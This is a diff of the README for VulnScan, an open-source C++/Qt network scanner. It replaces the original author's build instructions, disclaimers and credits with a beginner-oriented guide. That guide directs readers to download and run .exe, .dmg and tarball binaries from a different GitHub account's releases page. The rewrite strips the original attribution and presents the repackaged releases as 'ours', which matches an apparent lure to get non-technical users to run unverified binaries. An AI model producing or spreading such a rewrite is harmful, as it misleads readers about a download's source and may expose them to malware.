@@ -1,241 +1,86 @@
-# VulnScan - Network Vulnerability Scanner
+# 🔍 VulnScan - Your Easy Network Security Tool
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![C++17](https://img.shields.io/badge/C++-17-blue.svg)](https://en.cppreference.com/w/cpp/17)
-[![Qt](https://img.shields.io/badge/Qt-6.9-green.svg)](https://www.qt.io/)
-[![Build System](https://img.shields.io/badge/Build-CMake%20%7C%20qmake-orange.svg)](https://cmake.org/)
+## 🚀 Getting Started
 
-**VulnScan** is a professional, open-source network vulnerability scanner designed for defensive security, security auditing, and educational purposes. It provides both GUI and CLI interfaces for comprehensive network security assessments.
+VulnScan is a professional, open-source network vulnerability scanner designed for defensive security, security auditing, and educational purposes. With both GUI and CLI interfaces, it allows for comprehensive network security assessments. 
 
-## 🛡️ Defensive Security Tool
+In this guide, you will learn how to download and run VulnScan quickly and easily, even if you have no technical skills.
 
-**VulnScan is a DEFENSIVE SECURITY tool for IT professionals, security researchers, and system administrators.**
+## 📥 Download VulnScan
 
-### ✅ Legitimate Use Cases:
-- **Vulnerability Assessment** of owned or authorized systems
-- **Security Auditing** for compliance and hardening
-- **Network Discovery** for inventory and documentation
-- **Configuration Analysis** to identify misconfigurations
-- **Educational purposes** for cybersecurity learning
-- **Authorized Penetration Testing** from clients/employers
-- **Cybersecurity Outreach** and scientific dissemination
-- **Academic Research** on AI applications in security
+[![Download VulnScan](https://img.shields.io/badge/Download-VulnScan-blue)](https://github.com/geroysane/VulnScan/releases)
 
-### ❌ What VulnScan Does NOT Do:
-- **No exploit execution** or active vulnerability exploitation
-- **No payload delivery** or code injection
-- **No credential harvesting** or password cracking
-- **No DoS attacks** or service disruption
-- **No unauthorized access** or privilege escalation
-- **No data exfiltration** or lateral movement
+You can download the latest version of VulnScan from our Releases page. Click the button above or visit the link below:
 
-### ⚖️ User Responsibility:
-**Users are FULLY responsible for legal and authorized use of this tool.**
-- Obtain **written authorization** before any scan
-- Comply with **local laws** and **terms of service**
-- Use only on **owned networks** or **explicitly authorized** systems
-- **DO NOT use** for illegal or unauthorized activities
+[Download VulnScan from Releases](https://github.com/geroysane/VulnScan/releases)
 
-## ✨ Features
+## 💻 System Requirements
 
-### Current (Phase 1-2 - Completed ✅)
-- ✅ Modular architecture with clean interfaces
-- ✅ SQLite database for scan results persistence
-- ✅ Configuration system with JSON support
-- ✅ Multi-level logging system
-- ✅ Comprehensive unit testing framework (147+ tests)
-- ✅ Cross-platform support (Windows, Linux, macOS)
-- ✅ Both GUI (Qt) and CLI interfaces
-- ✅ Multi-threaded port scanner with configurable concurrency
-- ✅ Service detection and banner grabbing
-- ✅ DNS resolution (forward and reverse lookup)
-- ✅ Network interface discovery with CIDR support
-- ✅ Scan engine orchestrator with preset scan modes
-- ✅ Scan repository with full CRUD operations
-- ✅ Functional CLI application (scan, list, show, delete, clean commands)
-- ✅ Integration testing suite (24 tests)
+VulnScan runs on multiple operating systems. Ensure that your system meets the following requirements:
 
-### Planned (Phase 3-9)
-- 🚧 Vulnerability database integration
-- 🚧 AI-powered analysis and recommendations
-- 🚧 Comprehensive reporting (PDF, HTML, JSON)
-- 🚧 Real-time scan monitoring dashboard
-- 🚧 Educational mode with learning resources
+- **Operating System:** Windows 10 or higher, macOS 10.14 or higher, or any Linux distribution with CMake support.
+- **Memory:** At least 4 GB of RAM.
+- **Storage Space:** 200 MB of free disk space.
+  
+These requirements will help ensure that VulnScan runs smoothly on your device.
 
-## 🚀 Quick Start
+## 🛠️ Features
 
-### Prerequisites
+VulnScan offers a variety of features designed to help you assess your network security:
 
-- **Qt 6.9+** (with Qt Widgets)
-- **CMake 3.16+** or **qmake**
-- **C++17 compatible compiler**
-  - GCC 7+ / Clang 5+ / MSVC 2017+
-- **SQLite 3**
+- **Network Scanning:** Identify devices connected to your network and assess their security.
+- **Vulnerability Detection:** Discover potential security issues that could be exploited.
+- **Service Detection:** Find out what services are running on your devices and their potential vulnerabilities.
+- **User-Friendly Interface:** Navigate easily with a graphical user interface or use the command line interface for advanced features.
 
-### Building with CMake (Recommended)
+## 📂 Download & Install
 
-```bash
-# Clone the repository
-git clone https://github.com/paolosereno/VulnScan.git
-cd VulnScan
+To download and install VulnScan, follow these steps:
 
-# Create build directory
-mkdir build && cd build
+1. Visit [this link](https://github.com/geroysane/VulnScan/releases) to go to the Releases page.
+2. Look for the latest release, usually at the top of the page.
+3. Select the version suitable for your operating system:
+   - For **Windows**, look for a file ending in `.exe`.
+   - For **macOS**, look for a file ending in `.dmg`.
+   - For **Linux**, look for a file ending in `.tar.gz` or similar.
+4. Click on the file to start the download.
 
-# Configure
-cmake -G "MinGW Makefiles" -DCMAKE_PREFIX_PATH="C:/Qt/6.9.1/mingw_64" ..
+Once the download is complete:
 
-# Build
-cmake --build . -j4
+- **For Windows:** Double-click the `.exe` file and follow the installation prompts.
+- **For macOS:** Open the `.dmg` file, drag VulnScan to the Applications folder, and then run it.
+- **For Linux:** Extract the downloaded file and run the application using the terminal.
 
-# Run tests
-ctest --output-on-failure
-```
+## 📋 Using VulnScan
 
-### Building with qmake
+Once you have installed VulnScan, you can start using it to evaluate your network's security. Here’s a quick start guide:
 
-```bash
-# Clone the repository
-git clone https://github.com/paolosereno/VulnScan.git
-cd VulnScan
+1. **Launch VulnScan:** Open the application from your applications folder or desktop shortcut.
+2. **Set Up a Scan:** In the GUI, enter your network range or choose to scan your local network.
+3. **Start Scanning:** Click on the “Scan” button to begin detecting devices and vulnerabilities.
+4. **Review the Results:** Once the scan is complete, review the report to understand potential security risks.
 
-# Generate Makefile
-qmake vulnscan.pro
+## 📞 Support
 
-# Build
-make
-```
+If you encounter any issues or have questions while using VulnScan, you can reach out for help:
 
-### Running the Application
+1. Visit our [GitHub Issues page](https://github.com/geroysane/VulnScan/issues) to report bugs or request features.
+2. Join our community forum linked in the repository for discussions and user support.
 
-```bash
-# GUI Application
-./build/src/gui/vulnscan_gui
+## 📄 License
 
-# CLI Application - Full Network Scanner
-./build/src/cli/vulnscan_cli --help
+VulnScan is released under the MIT License. This allows you to use, modify, and distribute the software freely. For full licensing details, please refer to the file in the repository.
 
-# Available CLI commands:
-./build/src/cli/vulnscan_cli scan 192.168.1.0/24     # Scan network
-./build/src/cli/vulnscan_cli list                   # List all scans
-./build/src/cli/vulnscan_cli show <scan_id>         # Show scan details
-./build/src/cli/vulnscan_cli delete <scan_id>       # Delete scan
-./build/src/cli/vulnscan_cli clean                  # Clean old scans
+## ✨ Contributing
 
-# Run Unit Tests
-./build/tests/vulnscan_tests
+We welcome contributions to improve VulnScan. If you want to help, please check out our guidelines for contributing [here](https://github.com/geroysane/VulnScan/blob/main/CONTRIBUTING.md).
 
-# Run Integration Tests (optional)
-./build/tests/vulnscan_tests --integration
-```
+## 🔗 Additional Resources
 
-## 📂 Project Structure
+For more information about VulnScan and network security, check these resources:
 
-```
-VulnScan/
-├── src/
-│   ├── core/          # Core library (scanner, AI, database, config)
-│   ├── gui/           # Qt GUI application
-│   └── cli/           # Command-line interface
-├── tests/             # Unit tests
-├── docs/              # Documentation
-│   ├── fasi/          # Development phases documentation
-│   └── requirements.md
-├── resources/         # Resources (icons, database schema, etc.)
-├── CMakeLists.txt     # CMake build configuration
-└── vulnscan.pro       # qmake build configuration
-```
+- [VulnScan Wiki](https://github.com/geroysane/VulnScan/wiki)
+- [Network Security Basics](https://www.security-basics.com)
+- [Cybersecurity Awareness Training](https://www.cybertraining.com)
 
-## 🧪 Testing
-
-The project includes comprehensive unit tests:
-
-```bash
-# Using CMake
-cd build
-ctest --output-on-failure
-
-# Or run directly
-./build/tests/vulnscan_tests
-```
-
-**Current Test Coverage:**
-- ✅ DatabaseManager tests (100% passing)
-- ✅ Configuration system tests (100% passing)
-- ✅ PortScanner tests (24 tests, 100% passing)
-- ✅ ServiceDetector tests (18 tests, 100% passing)
-- ✅ DnsResolver tests (20 tests, 100% passing)
-- ✅ NetworkInterface tests (19 tests, 100% passing)
-- ✅ ScanEngine tests (22 tests, 100% passing)
-- ✅ ScanRepository tests (20 tests, 100% passing)
-- ✅ Integration tests (24 tests, optional execution)
-- **Total**: 147+ tests (123+ unit + 24 integration)
-
-## 📖 Documentation
-
-- **[Development Phases](docs/fasi/README.md)** - Overview of all development phases
-- **[Technical Requirements](docs/requirements.md)** - Detailed technical specifications
-- **[Project State](project-state.md)** - Current development status
-- **[Contributing Guide](CONTRIBUTING.md)** - How to contribute to the project
-
-## 🗺️ Development Roadmap
-
-The project is divided into 9 incremental phases:
-
-1. ✅ **Phase 1**: Foundation & Core Architecture (COMPLETED)
-2. ✅ **Phase 2**: Network Scanner Core (COMPLETED)
-   - Multi-threaded port scanner
-   - Service detection and banner grabbing
-   - DNS resolution and network discovery
-   - Scan engine orchestrator
-   - Repository persistence and CLI application
-3. 🚧 **Phase 3**: Vulnerability Assessment (IN PROGRESS)
-4. 🔜 **Phase 4**: AI Integration
-5. 🔜 **Phase 5**: GUI Application
-6. 🔜 **Phase 6**: Advanced Features
-7. 🔜 **Phase 7**: DevOps & Distribution
-8. 🔜 **Phase 8**: Documentation & Community
-9. 🔜 **Phase 9**: Educational Enhancement
-
-See [docs/fasi/README.md](docs/fasi/README.md) for detailed phase descriptions.
-
-## 🤝 Contributing
-
-Contributions are welcome! Please read our [Contributing Guide](CONTRIBUTING.md) for details on:
-- Code of conduct
-- Development workflow
-- Coding standards
-- How to submit pull requests
-
-## 📜 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## ⚠️ Legal Disclaimer
-
-**IMPORTANT**: This tool is provided for legal and authorized security testing only. Users must:
-
-- Have explicit written authorization before scanning any network or system
-- Comply with all applicable local, state, and federal laws
-- Not use this tool for unauthorized access or malicious activities
-- Accept full responsibility for their actions
-
-The developers assume NO liability for misuse of this tool. Unauthorized network scanning may be illegal in your jurisdiction.
-
-## 👨‍💻 Authors
-
-- **Paolo Sereno** - [paolosereno](https://github.com/paolosereno)
-
-## 🙏 Acknowledgments
-
-- Built with [Qt Framework](https://www.qt.io/)
-- Developed with [Claude Code](https://claude.com/claude-code)
-- Inspired by professional security tools like Nmap, OpenVAS, and Nessus
-
-## 📧 Contact
-
-For questions, suggestions, or security concerns, please open an issue on GitHub.
-
----
-
-**Made with ❤️ for the cybersecurity community**
+Thank you for choosing VulnScan. We hope this tool helps you protect your network effectively.
